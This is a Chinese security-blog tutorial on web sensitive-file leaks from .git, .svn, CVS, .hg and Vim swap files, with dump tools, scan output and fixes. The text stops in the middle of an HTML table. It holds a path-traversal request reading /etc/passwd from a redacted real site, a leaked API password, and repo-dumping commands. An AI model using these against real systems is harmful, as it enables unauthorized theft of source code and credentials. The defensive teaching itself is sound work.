> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzg3ODE2MjkxMQ==&mid=2247493250&idx=1&sn=cd317dbe8c78874a262dce46efcc5cc3

#  WEB安全盲点 挖洞中的敏感文件泄漏漏洞与利用手法|挖洞技巧  
PDX666 Bypass007  渗透安全HackTwo   2025-07-13 16:00  
  
**0x01 前言**  
   
  
敏感文件如版本控制目录、备份文件、配置文件等若未妥善保护，极易成为攻击者获取源代码、账号密码等关键资产的突破口。本文将聚焦WEB中常见的敏感文件泄露漏洞，结合实战利用手法和有效加固措施，带你全面了解各种WEB敏感文件泄露的典型案例和实用防御策略  
。  
  
现在只对常读和星标的公众号才展示大图推送，建议大家把**渗透安全HackTwo“设为星标”，否则可能就看不到了啦！**  
  
参考文章  
  

```
https://www.secpulse.com/archives/124398.html
https://www.freebuf.com/articles/web/438795.html
https://www.cnblogs.com/xiaozi/p/12397114.html
```

  
  
**末尾可领取挖洞资料文件 #渗透安全HackTwo**  
  
**0x02 漏洞详情**  
  
Git文件泄露**漏洞**  
  
简介  
  
Git泄露是指在使用Git版本控制系统时，由于配置不当或者操作失误，导致敏感信息（如密码、密钥、源代码等）被意外地上传到公开的代码仓库或者其他公开可访问的地方，从而被未授权的人获取到。  
  
Git泄露危害  
  
正如简介所说，在配置不当的情况下，可能会将“.git”文件直接部署到线上环境，这就造成了git泄露问题。  
  
攻击者利用该漏洞下载.git文件夹中的所有内容。如果文件夹中存在敏感信息(数据库账号密码、源码等)，通过白盒的审计等方式就可能直接获得控制服务器的权限和机会！  
  
利用  
  
工具下载连接：  

```
https://github.com/internetwache/GitTools
github项目地址：https://github.com/lijiejie/GitHack
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5oWhQnt0R7y7t7EeX83NkBmpAFYAZXdzPoUicYSOz4bpo0ELzicSVk3Z9S2fI1fyqcVhaGnJrkGdtQ/640?wx_fmt=png&from=appmsg "")  
  
目录扫描判断是否有.git文件泄露  

```
dirsearch -u http://node4.anna.nssctf.cn:28221/ -i 200
[01:59:30] 200 -    5B  - /.git/COMMIT_EDITMSG                              
[01:59:30] 200 -  137B  - /.git/config                                      
[01:59:30] 200 -   73B  - /.git/description                                 
[01:59:30] 200 -   23B  - /.git/HEAD
[01:59:30] 200 -  209B  - /.git/index                                       
[01:59:30] 200 -  240B  - /.git/info/exclude
[01:59:30] 200 -  147B  - /.git/logs/HEAD                                   
[01:59:30] 200 -  147B  - /.git/logs/refs/heads/master                      
[01:59:30] 200 -   41B  - /.git/refs/heads/master                           
[01:59:41] 200 -    0B  - /flag.php           
```

  
爬取仓库的git文件  

```
./gitdumper.sh http://node4.anna.nssctf.cn:28221/.git/ githack
[*] Destination folder does not exist
[+] Creating githack/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
```

  
通过审计git下载的文件挖到  
任意文件读取漏洞  
  
这个漏洞是我通过全局搜索https://+域名的一个方式找找有没有关于主域名向其他地方引用或者有关后台这类的信息并且我在扫描完的目录夹里面看到了PDF文件，所以也不能排除掉相关的下载URL。OK，我们继续，这里发现了一个接口，名为 actionCurlImage，用于向指定的 API 端点发送 POST 请求，并上传图像文件。代码中使用了 cURL 函数库来执行 HTTP 请求。就是这么一个动作，不管凭证是否失效，但是发现了一些问题：  

```
$url = 'https://XXXXXXXXXXXXX.com.ua/api/update_products?login=user&password=CLYbBvZkdx8Q8q6aL7DywvBmrq5BF6T8';
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5oWhQnt0R7y7t7EeX83NkBlKkQN9NuHwBj5Z7f8HhLqFDgaCugRRBmpQBSqQI3ESuhG54hwgutGg/640?wx_fmt=png&from=appmsg "")  
  
在开始之前我是在项目随后我借着往下看这代码，发现这个下载地址 Скачать прайс-лист翻译过来也就是下载价格列表。连接是这样的：  

```
https://XXXXXXX.com.ua/pricelist.php?file=20xxx_010001_1.xls
```

  
整个下载过程也是特别的简陋，$priceLists = Yii::app()->params['priceLists']; 这行代码从 Yii 框架的全局配置参数中获取 priceLists 的值。  
  
$priceLists->name_part_1 这行代码访问 priceLists 对象的 name_part_1 属性，并将其作为查询参数 file 传递给 https://XXXXXXXXXXX.ua/pricelist.php 页面。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5oWhQnt0R7y7t7EeX83NkBch6micgrJ06TdhMib2Pw3UJwOhzGCAnDJ2OtFXgwMia1icNK9eh39Efq3A/640?wx_fmt=png&from=appmsg "")  

```
<li>
<?php $priceLists = Yii::app()->params['priceLists'];?>
<a href=&#34;https://XXXXXXXXXXXX.com.ua/pricelist.php?file=<?php echo $priceLists->name_part_1;?>&#34;>
<?php echo Yii::t('app', 'Скачать прайс-лист'); ?>
</a>
</li>
```

  
尝试文件读取，这里尝试是向上遍历四个层级目录  

```
GET /pricelist.php?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: XXXXXXXXXXX.com.ua
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: 
Priority: u=0, i
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5oWhQnt0R7y7t7EeX83NkBSuUnwlBKqUicaANZfWBApBNmOY1haaicgl5gzP9BcLRcxESGA7XKoSRQ/640?wx_fmt=png&from=appmsg "")  
### 修复  
  
不要把.git文件暴露在网站根目录下  
  
阻止访问
```
.git
```

  
目录  
  
svn泄露**漏洞**  
### 简介  
> [!NOTE] SVN是什么  
**SVN（Subversion）**  
是一种版本控制工具，类似于 Git，用于跟踪源代码的更改。  
  
SVN 会在每个版本库目录中生成
```
.svn/
```

  
隐藏目录，里面包含了该目录下所有文件的版本信息。  
  
  

```
SVN
```

  
泄露通常指的是 Web 服务器部署时 **错误上传了 Subversion 版本控制系统（SVN）的元数据目录.svn/**  
，导致攻击者可以还原网站源码，获取敏感信息，甚至构造进一步攻击。  
### SVN 泄露危害  
  
攻击者可以通过
```
.svn/
```

  
目录中保存的元数据，**还原出源码文件**  
，从而：  
- 获取配置文件（如
```
config.php
```

  
、
```
.env
```

  
）  
  
- 查看源码逻辑，发现漏洞（如 RCE、SQL 注入）  
  
- 获取敏感路径、后台入口、账号密码等  
  
### 利用  
  
工具：  

```
https://github.com/admintony/svnExploit
```

  
扫描到.svn直接用工具去下载源码  

```
简介
[!NOTE] SVN是什么
SVN（Subversion）是一种版本控制工具，类似于 Git，用于跟踪源代码的更改。
SVN 会在每个版本库目录中生成.svn/隐藏目录，里面包含了该目录下所有文件的版本信息。


SVN泄露通常指的是 Web 服务器部署时 错误上传了 Subversion 版本控制系统（SVN）的元数据目录.svn/，导致攻击者可以还原网站源码，获取敏感信息，甚至构造进一步攻击。


SVN 泄露危害
攻击者可以通过.svn/目录中保存的元数据，还原出源码文件，从而：


获取配置文件（如config.php、.env）


查看源码逻辑，发现漏洞（如 RCE、SQL 注入）


获取敏感路径、后台入口、账号密码等


利用
工具：
https://github.com/admintony/svnExploit


扫描到.svn直接用工具去下载源码


____             _____            _       _ _
/ ___|_   ___ __ | ____|_  ___ __ | | ___ (_) |_
\___ \ \ / / '_ \|  _| \ \/ / '_ \| |/ _ \| | __|
 ___) \ V /| | | | |___ >  <| |_) | | (_) | | |_
|____/ \_/ |_| |_|_____/_/\_\ .__/|_|\___/|_|\__|
                            |_|
SvnExploit - Dump the source code by svn
Author: AdminTony (http://admintony.com)
https://github.com/admintony/svnExploit




+--------------------+----------+------------------------------------------------+
|       文件名       | 文件类型 |                    CheckSum                    |
+--------------------+----------+------------------------------------------------+
|     index.html     |   file   | $sha1$bf45c36a4dfb73378247a6311eac4f80f48fcb92 |
| flag_510328456.txt |   file   |                      None                      |
+--------------------+----------+------------------------------------------------+
[+] 已经Dump完成!
修复
操作	方法
禁止访问.svn/目录	nginx/apache 拦截.svn
清理.svn/元数据目录	部署时使用rsync --exclude='.svn/'、CI/CD


```

  
修复  
<table><thead><tr style="box-sizing: border-box;margin: 0px;padding: 0px;border: 0px;text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;"><th style="box-sizing: border-box;text-align: center;margin: 0px;padding: 0px;border-top: 1px solid rgb(204, 204, 204);border-right: 1px solid rgb(204, 204, 204);border-bottom: none;border-left: 1px solid rgb(204, 204, 204);border-image: initial;text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: 550;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;background: rgb(245, 245, 245);"><section style="margin-bottom: 0px;margin-top: 0px;"><span leaf=""><span textstyle="" style="font-size: 16px;">操作</span></span></section></th><th style="box-sizing: border-box;text-align: center;margin: 0px;padding: 0px;border-top: 1px solid rgb(204, 204, 204);border-right: 1px solid rgb(204, 204, 204);border-bottom: none;border-left: 1px solid rgb(204, 204, 204);border-image: initial;text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: 550;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;background: rgb(245, 245, 245);"><section style="margin-bottom: 0px;margin-top: 0px;"><span leaf=""><span textstyle="" style="font-size: 16px;">方法</span></span></section></th></tr></thead><tbody><tr style="box-sizing: border-box;margin: 0px;padding: 0px;border: 0px;text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;"><td style="box-sizing: border-box;margin: 0px;padding: 5px;border: 1px solid rgb(204, 204, 204);text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;text-align: left;word-break: break-word;white-space: pre-wrap;"><section style="margin-bottom: 0px;margin-top: 0px;"><span leaf=""><span textstyle="" style="font-size: 16px;">禁止访问</span></span><code style="box-sizing: border-box;font-size: inherit;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;margin-right: 0px;margin-left: 0px;padding: 0px;border: 0px;text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;outline: none;"><span leaf=""><span textstyle="" style="font-size: 16px;">.svn/</span></span></code><span leaf=""><span textstyle="" style="font-size: 16px;">目录</span></span></section></td><td style="box-sizing: border-box;margin: 0px;padding: 5px;border: 1px solid rgb(204, 204, 204);text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;text-align: left;word-break: break-word;white-space: pre-wrap;"><section style="margin-bottom: 0px;margin-top: 0px;"><span leaf=""><span textstyle="" style="font-size: 16px;">nginx/apache 拦截</span></span><code style="box-sizing: border-box;font-size: inherit;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;margin-right: 0px;margin-left: 0px;padding: 0px;border: 0px;text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;outline: none;"><span leaf=""><span textstyle="" style="font-size: 16px;">.svn</span></span></code></section></td></tr><tr style="box-sizing: border-box;margin: 0px;padding: 0px;border: 0px;text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;"><td style="box-sizing: border-box;margin: 0px;padding: 5px;border: 1px solid rgb(204, 204, 204);text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;text-align: left;word-break: break-word;white-space: pre-wrap;"><section style="margin-bottom: 0px;margin-top: 0px;"><span leaf=""><span textstyle="" style="font-size: 16px;">清理</span></span><code style="box-sizing: border-box;font-size: inherit;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;margin-right: 0px;margin-left: 0px;padding: 0px;border: 0px;text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;outline: none;"><span leaf=""><span textstyle="" style="font-size: 16px;">.svn/</span></span></code><span leaf=""><span textstyle="" style="font-size: 16px;">元数据目录</span></span></section></td><td style="box-sizing: border-box;margin: 0px;padding: 5px;border: 1px solid rgb(204, 204, 204);text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;text-align: left;word-break: break-word;white-space: pre-wrap;"><section style="margin-bottom: 0px;margin-top: 0px;"><span leaf=""><span textstyle="" style="font-size: 16px;">部署时使用</span></span><code style="box-sizing: border-box;font-size: inherit;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;margin-right: 0px;margin-left: 0px;padding: 0px;border: 0px;text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;outline: none;"><span leaf=""><span textstyle="" style="font-size: 16px;">rsync --exclude=&#39;.svn/&#39;</span></span></code><span leaf=""><span textstyle="" style="font-size: 16px;">、CI/CD</span></span></section></td></tr></tbody></table>### CVS泄露漏洞  
  
CVS是一个C/S系统，多个开发人员通过一个中心版本控制系统来记录文件版本，从而达到保证文件同步的目的。主要是针对 CVS/Root以及CVS/Entries目录，直接就可以看到泄露的信息。  

```
http://url/CVS/Root 返回根信息
http://url/CVS/Entries 返回所有文件的结构
```

  
漏洞利用工具：dvcs-ripper  
  
github项目地址：  

```
https://github.com/kost/dvcs-ripper.git
```

  
运行示例:  

```
rip-cvs.pl -v -u http://www.example.com/CVS/
```

  
Hg泄露**漏洞**  
### 简介  

```
[!NOTE] Mercurial是什么Mercurial是一个分布式版本控制系统，命令行为
hg，与 Git 类似。项目的所有提交记录、文件历史、分支信息等都存储在
.hg/目录中。Hg 和 Git 一样，如果
.hg/目录暴露在 Web 服务器上，就可能泄露整个项目源代码。
```

  
**Hg 泄露**  
是指 Web 服务器将包含敏感数据的
```
.hg/
```

  
目录暴露给了公网用户，攻击者可以通过访问或下载该目录来恢复整个源代码仓库，从而分析业务逻辑、找出漏洞点甚至获取密码等敏感信息。  
### Hg泄露的危害  
  
攻击者绕过任何认证机制，直接拿到**开发者内部视角**  
，分析业务逻辑、发现安全漏洞、横向扩展攻击。  
### 利用  
  
利用.hg泄露可以用到一个工具dvcs-ripper  
  
下载地址：  

```
https://github.com/kost/dvcs-rippe
```


```
#漏洞利用的代码
perl rip-hg.pl -v -u http://www.test.com/.hg/
```

  
Vim文件泄露漏洞  
### 简介  
  
Vim 文件泄露指的是 Vim 编辑器在保存、编辑文件时生成的一些临时文件或备份文件被意外暴露，攻击者可利用这些文件获取源代码、配置、密码等敏感信息，常见于 Web 目录下误上传的情况。  
  
常见文件后缀名：  
<table><thead><tr style="box-sizing: border-box;margin: 0px;padding: 0px;border: 0px;text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;"><th style="box-sizing: border-box;text-align: center;margin: 0px;padding: 0px;border-top: 1px solid rgb(204, 204, 204);border-right: 1px solid rgb(204, 204, 204);border-bottom: none;border-left: 1px solid rgb(204, 204, 204);border-image: initial;text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: 550;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;background: rgb(245, 245, 245);"><section style="margin-bottom: 16px;"><span leaf=""><span textstyle="" style="font-size: 16px;">文件名类型</span></span></section></th><th style="box-sizing: border-box;text-align: center;margin: 0px;padding: 0px;border-top: 1px solid rgb(204, 204, 204);border-right: 1px solid rgb(204, 204, 204);border-bottom: none;border-left: 1px solid rgb(204, 204, 204);border-image: initial;text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: 550;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;background: rgb(245, 245, 245);"><section style="margin-bottom: 16px;"><span leaf=""><span textstyle="" style="font-size: 16px;">说明</span></span></section></th><th style="box-sizing: border-box;text-align: center;margin: 0px;padding: 0px;border-top: 1px solid rgb(204, 204, 204);border-right: 1px solid rgb(204, 204, 204);border-bottom: none;border-left: 1px solid rgb(204, 204, 204);border-image: initial;text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: 550;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;background: rgb(245, 245, 245);"><section style="margin-bottom: 16px;"><span leaf=""><span textstyle="" style="font-size: 16px;">泄露风险</span></span></section></th></tr></thead><tbody><tr style="box-sizing: border-box;margin: 0px;padding: 0px;border: 0px;text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;"><td style="box-sizing: border-box;margin: 0px;padding: 5px;border: 1px solid rgb(204, 204, 204);text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;text-align: left;word-break: break-word;white-space: pre-wrap;"><code style="box-sizing: border-box;font-size: inherit;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;margin: 0px;padding: 0px;border: 0px;text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;outline: none;"><span leaf=""><span textstyle="" style="font-size: 16px;">.filename.swp</span></span></code></td><td style="box-sizing: border-box;margin: 0px;padding: 5px;border: 1px solid rgb(204, 204, 204);text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;text-align: left;word-break: break-word;white-space: pre-wrap;"><section style="margin-bottom: 16px;"><span leaf=""><span textstyle="" style="font-size: 16px;">Vim 的</span></span><strong style="box-sizing: border-box;font-weight: 700;margin-top: 0px;margin-right: 0px;margin-left: 0px;padding: 0px;border: 0px;text-decoration: none;font-style: normal;font-variant: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;"><span leaf=""><span textstyle="" style="font-size: 16px;">交换文件（swap）</span></span></strong></section></td><td style="box-sizing: border-box;margin: 0px;padding: 5px;border: 1px solid rgb(204, 204, 204);text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;text-align: left;word-break: break-word;white-space: pre-wrap;"><section style="margin-bottom: 16px;"><span leaf=""><span textstyle="" style="font-size: 16px;">包含编辑中的内容，可能包含源码、口令等</span></span></section></td></tr><tr style="box-sizing: border-box;margin: 0px;padding: 0px;border: 0px;text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;"><td style="box-sizing: border-box;margin: 0px;padding: 5px;border: 1px solid rgb(204, 204, 204);text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;text-align: left;word-break: break-word;white-space: pre-wrap;"><code style="box-sizing: border-box;font-size: inherit;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;margin: 0px;padding: 0px;border: 0px;text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;outline: none;"><span leaf=""><span textstyle="" style="font-size: 16px;">.filename.swo</span></span></code></td><td style="box-sizing: border-box;margin: 0px;padding: 5px;border: 1px solid rgb(204, 204, 204);text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;text-align: left;word-break: break-word;white-space: pre-wrap;"><section style="margin-bottom: 16px;"><span leaf=""><span textstyle="" style="font-size: 16px;">辅助交换文件</span></span></section></td><td style="box-sizing: border-box;margin: 0px;padding: 5px;border: 1px solid rgb(204, 204, 204);text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;text-align: left;word-break: break-word;white-space: pre-wrap;"><section style="margin-bottom: 16px;"><span leaf=""><span textstyle="" style="font-size: 16px;">与</span></span><code style="box-sizing: border-box;font-size: inherit;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;margin-top: 0px;margin-right: 0px;margin-left: 0px;padding: 0px;border: 0px;text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;outline: none;"><span leaf=""><span textstyle="" style="font-size: 16px;">.swp</span></span></code><span leaf=""><span textstyle="" style="font-size: 16px;">类似</span></span></section></td></tr><tr style="box-sizing: border-box;margin: 0px;padding: 0px;border: 0px;text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;"><td style="box-sizing: border-box;margin: 0px;padding: 5px;border: 1px solid rgb(204, 204, 204);text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: none;text-align: left;word-break: break-word;white-space: pre-wrap;"><code style="box-sizing: border-box;font-size: inherit;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;margin: 0px;padding: 0px;border: 0px;text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;outline: none;"><span leaf=""><span textstyle="" style="font-size: 16px;">.filename.swn</span></span></code></td><td style="box-sizing: border-box;margin: 0px;padding: 5px;border: 1px solid rgb(204, 204, 204);text-decoration: none;font-style: inherit;font-variant: inherit;font-weight: inherit;font-stretch: inherit;font-size: inherit;line-height: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;font-family: 微软雅黑, &#34;Microsoft YaHei&#34;, &#34;WenQuanYi Micro Hei&#34;, PingFangSC;outline: 